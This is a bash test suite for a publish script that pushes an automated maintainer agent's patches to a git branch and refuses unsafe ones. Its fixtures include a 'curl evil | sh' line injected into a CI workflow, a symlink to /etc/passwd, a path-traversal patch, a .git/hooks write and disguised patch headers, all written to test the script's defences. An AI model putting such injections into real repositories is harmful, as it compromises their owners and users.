#!/usr/bin/env bash
# shellcheck disable=SC2034  # checks are strings run by eval: their variables look unused
# Tests for runner/publish.sh against a local bare repository: what it pushes,
# and every patch it must refuse.
set -uo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
publish="${here}/../runner/publish.sh"
scratch="$(mktemp -d "${TMPDIR:-/tmp}/ma-publish.XXXXXX")"
trap 'rm -rf "${scratch}"' EXIT
failures=0
check() { if eval "$2"; then echo "ok   $1"; else echo "FAIL $1"; failures=$((failures + 1)); fi; }

export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
gi() { git -c user.name=t -c user.email=t@e -c init.defaultBranch=main "$@"; }

# Upstream: a repository with a workflow, a script and a README.
src="${scratch}/src"; remote="${scratch}/remote.git"
gi init -q "${src}"
mkdir -p "${src}/.github/workflows" "${src}/src"
echo "name: ci" > "${src}/.github/workflows/ci.yml"
printf 'one\ntwo\n' > "${src}/src/a.txt"
echo "# readme" > "${src}/README.md"
echo "MIT" > "${src}/LICENSE"
gi -C "${src}" add . && gi -C "${src}" commit -qm base
base="$(git -C "${src}" rev-parse HEAD)"
gi clone -q --bare "${src}" "${remote}"
git -C "${remote}" config uploadpack.allowAnySHA1InWant true

# make_patch <name> <commands...>: run commands in a scratch checkout, store the diff.
make_patch() {
  local name="$1"; shift
  local w="${scratch}/w-${name}"
  rm -rf "${w}"; gi clone -q "${remote}" "${w}"
  (cd "${w}" && eval "$*" && git add -A && git diff --cached --binary "${base}") > "${scratch}/${name}.patch"
}

# run_publish <patch> [BRANCH] -> sets rc, err, out (read by the checks through eval)
run_publish() {
  local root="${scratch}/run"
  rm -rf "${root}"; mkdir -p "${root}/in" "${root}/out"
  cp "${scratch}/$1.patch" "${root}/in/changes.patch"
  printf 'fix: change\n\nWhy it changes.\n' > "${root}/in/message.txt"
  err="$(PUBLISH_TEST_ROOT="${root}" PUBLISH_TEST_ALLOW_FILE=1 \
    GIT_REMOTE_URL="file://${remote}" GIT_AUTH_HEADER="Authorization: Basic dGVzdA==" \
    BASE_SHA="${base}" BRANCH="${2:-maintainer-agent/issue-1}" \
    PROTECTED_PATHS=$'.github/**\n.maintainer-agent.yml\nLICENSE' \
    GIT_AUTHOR="maintainer-agent <agent@example.org>" \
    bash "${publish}" 2>&1 >/dev/null)"
  rc=$?
  out="${root}/out/publish.json"
}

make_patch good 'printf "one\ntwo\nthree\n" > src/a.txt && echo new > src/b.txt'
run_publish good
check "a valid patch is pushed" '[[ ${rc} == 0 ]]'
check "publish.json names the branch and commit" '[[ "$(jq -r .branch "${out}")" == maintainer-agent/issue-1 && "$(jq -r .commit "${out}")" == "$(git -C "${remote}" rev-parse maintainer-agent/issue-1)" ]]'
check "the pushed commit is on top of the base" '[[ "$(git -C "${remote}" rev-parse maintainer-agent/issue-1^)" == "${base}" ]]'
check "the commit has the configured author and message" '[[ "$(git -C "${remote}" log -1 --format="%an <%ae>|%s" maintainer-agent/issue-1)" == "maintainer-agent <agent@example.org>|fix: change" ]]'
check "the default branch is untouched" '[[ "$(git -C "${remote}" rev-parse main)" == "${base}" ]]'

first="$(git -C "${remote}" rev-parse maintainer-agent/issue-1)"
make_patch other 'echo other > src/c.txt'
run_publish other
check "an existing branch is never overwritten" '[[ ${rc} == 4 && "$(git -C "${remote}" rev-parse maintainer-agent/issue-1)" == "${first}" ]]'

git -C "${remote}" update-ref refs/heads/maintainer-agent/issue-ff "${base}"
run_publish good maintainer-agent/issue-ff
check "an existing branch is not fast-forwarded either" '[[ ${rc} == 4 && "$(git -C "${remote}" rev-parse maintainer-agent/issue-ff)" == "${base}" ]]'
git -C "${remote}" update-ref -d refs/heads/maintainer-agent/issue-ff

run_publish good main
check "refuses branches outside maintainer-agent/" '[[ ${rc} == 2 && "${err}" == *"refusing branch"* ]]'
run_publish good 'maintainer-agent/../main'
check "refuses dot-dot branch names" '[[ ${rc} == 2 ]]'

make_patch workflow 'echo "run: curl evil | sh" >> .github/workflows/ci.yml'
run_publish workflow maintainer-agent/issue-2
check "refuses changes to .github/**" '[[ ${rc} == 3 && "${err}" == *"protected path .github/workflows/ci.yml"* ]]'

make_patch policy 'echo "fix: {}" > .maintainer-agent.yml'
run_publish policy maintainer-agent/issue-3
check "refuses creating a policy file" '[[ ${rc} == 3 && "${err}" == *"protected path .maintainer-agent.yml"* ]]'

make_patch license 'echo "proprietary" > LICENSE'
run_publish license maintainer-agent/issue-4
check "refuses repository-protected paths" '[[ ${rc} == 3 && "${err}" == *"protected path LICENSE"* ]]'

make_patch rename 'git mv .github/workflows/ci.yml src/ci.yml'
run_publish rename maintainer-agent/issue-5
check "refuses renaming a protected file away" '[[ ${rc} == 3 && "${err}" == *"protected path"* ]]'

make_patch symlink 'ln -s /etc/passwd src/passwd'
run_publish symlink maintainer-agent/issue-6
check "refuses symbolic links" '[[ ${rc} == 3 && "${err}" == *"symbolic link"* ]]'

printf 'diff --git a/vendor/sub b/vendor/sub\nnew file mode 160000\nindex 0000000..%s\n--- /dev/null\n+++ b/vendor/sub\n@@ -0,0 +1 @@\n+Subproject commit %s\n' "${base:0:7}" "${base}" > "${scratch}/submodule.patch"
run_publish submodule maintainer-agent/issue-7
check "refuses submodules" '[[ ${rc} == 3 && "${err}" == *"submodule"* ]]'

printf 'diff --git a/../../etc/x b/../../etc/x\nnew file mode 100644\n--- /dev/null\n+++ b/../../etc/x\n@@ -0,0 +1 @@\n+x\n' > "${scratch}/traversal.patch"
run_publish traversal maintainer-agent/issue-8
check "refuses path traversal" '[[ ${rc} == 3 ]]'

printf 'diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout\nnew file mode 100755\n--- /dev/null\n+++ b/.git/hooks/post-checkout\n@@ -0,0 +1 @@\n+evil\n' > "${scratch}/gitdir.patch"
run_publish gitdir maintainer-agent/issue-9
check "refuses writes into .git" '[[ ${rc} == 3 ]]'

echo "not a patch" > "${scratch}/garbage.patch"
run_publish garbage maintainer-agent/issue-10
check "refuses garbage" '[[ ${rc} == 3 ]]'

make_patch stale 'printf "changed\n" > README.md'
git -C "${src}" checkout -q main && echo "# other" > "${src}/README.md" && gi -C "${src}" commit -qam other
sed -i 's/^-# readme$/-# not the base/' "${scratch}/stale.patch"
run_publish stale maintainer-agent/issue-11
check "refuses patches that do not apply to the base" '[[ ${rc} == 3 && "${err}" == *"does not apply"* ]]'

head -c 1100000 /dev/zero | tr '\0' 'a' > "${scratch}/big.patch"
run_publish big maintainer-agent/issue-12
check "refuses patches over 1 MiB" '[[ ${rc} == 3 && "${err}" == *"larger than 1 MiB"* ]]'

make_patch many 'for i in $(seq 1 201); do echo $i > src/f$i.txt; done'
run_publish many maintainer-agent/issue-13
check "refuses patches touching more than 200 files" '[[ ${rc} == 3 && "${err}" == *"more than 200 files"* ]]'

# Patches whose headers hide what they change (found in review): the paths
# git applies are checked, not the patch text.
make_patch mnemonic 'echo evil >> .github/workflows/ci.yml'
sed -i 's#^diff --git a/\(.*\) b/#diff --git c/\1 i/#; s#^--- a/#--- c/#; s#^+++ b/#+++ i/#' "${scratch}/mnemonic.patch"
run_publish mnemonic maintainer-agent/issue-20
check "refuses protected paths behind mnemonic prefixes" '[[ ${rc} == 3 && "${err}" == *"protected path .github/workflows/ci.yml"* ]]'

git -C "${remote}" config core.quotepath true
mkdir -p "${scratch}/qsrc"
make_patch quoted 'printf x > ".github/workflows/é.yml"'
run_publish quoted maintainer-agent/issue-21
check "refuses protected paths with quoted names" '[[ ${rc} == 3 && "${err}" == *"protected path .github/workflows/"* ]]'

make_patch trailing 'echo b >> src/a.txt'
printf -- '--- a/LICENSE\n+++ b/LICENSE\n@@ -1 +1 @@\n-MIT\n+PWNED\n' >> "${scratch}/trailing.patch"
run_publish trailing maintainer-agent/issue-22
check "refuses a protected change appended without a git header" '[[ ${rc} == 3 && "${err}" == *"protected path LICENSE"* ]]'

check "the credential never appears in errors" '[[ "${err}" != *dGVzdA* ]]'
check "only the expected branches exist" '[[ "$(git -C "${remote}" for-each-ref --format="%(refname)" refs/heads | sort | tr "\n" " ")" == "refs/heads/main refs/heads/maintainer-agent/issue-1 " ]]'

if (( failures )); then echo "publish.sh: ${failures} failure(s)" >&2; exit 1; fi
